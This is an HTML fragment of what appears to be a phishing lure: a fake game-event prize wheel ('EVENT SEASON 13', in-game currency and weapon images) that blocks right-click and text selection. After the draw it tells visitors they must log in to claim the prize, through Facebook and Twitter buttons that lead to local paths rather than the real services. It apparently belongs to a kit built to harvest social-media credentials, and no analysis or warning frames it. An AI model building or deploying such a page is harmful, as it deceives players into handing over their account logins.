...
<body  oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
     <div class="sticky">
        <a href=""><img src="s3_light.png"></a>
    </div>
    <div class="slider-container">
        <div class="slider" style="display: none;"><img src="img/s5_pic_3.jpg" style="width:100%;"></div>
        <div class="slider" style="display: none;"><img src="img/s5_pic_2.jpg" style="width:100%;"></div>
        <div class="slider" style="display: none;"><img src="img/s5_pic_1.jpg" style="width:100%;"></div>
    </div>
    <div class="notification-container">
        <div class="notification">
            <span class="label1" style="font-family: teko;font-size: 17px">EVENT SEASON 13</span>
            ...
            <div id="zone" class="gallery">
                ...
                <section class="container" id="js-lotto">
                    <div class="square" data-order="0">
                        <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift1" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/011111.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift1)"></polygon></svg></div>
                    </div>
                    <div class="square" data-order="1">
                        <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift2" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/uc.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift2)"></polygon></svg></div>
                    </div>
                    <div class="squar" data-order="5">
                        <div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift3" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/akm7.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift3)"></polygon></svg></div>
                    </div>
                    <div class="start squar__start-btn" id="js-start">
                        <div>
                            <center>
                                <o onclick="klik1()"><img src="img/draw.png" width="100" height="110"></o>
                            </center>
                        </div>
                    </div>
                    <div class="squar" data-order="2">
                        <div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift4" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/mat.png" x="-25" width="150" height="110"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift4)"></polygon></svg></div>
                    </div>
                    <div class="square" data-order="4">
                        <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift5" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/001.png" x="-25" width="150" height="110"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift5)"></polygon></svg></div>
                    </div>
                    <div class="square" data-order="3">
                        <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift6" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/3.png" x="-25" width="150" height="110"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift6)"></polygon></svg></div>
                    </div>
                </section>
            </div>
            <br>
...
#claim{
    ...
    <div class="dav" id="hadiah" style="display:none ;">
       <div class="text-dav">
         You Got : 
         <h2 id="demo"></h2>
       </div>
       <div class="batas">
        ...
        <div class="bawah">
            <button id="claim" onclick="klik3()"></button>
        </div>
   </div>

   <div class="dav" id="dav" style="display:none ;">
       <div class="text-dav">
         <i class="fa fa-gift"></i> YOU MUST LOGIN TO CLAIM PRIZE <i class="fa fa-gift"></i>
         <h2 id="demo"></h2>
       </div>
       <div class="batas">
      <button class="btn-log fb" type="button" onclick="location.href='login/facebook';"><i class="fa fa-facebook-square" style="margin-top: 3px; float: left;"></i> Login with Facebook</button>
      <button class="btn-log tw" type="button" onclick="location.href='login/twitter';"><i class="fa fa-twitter" style="margin-top: 3px; float: left;"></i> Login with Twitter</button>                       
        </div>
   </div>
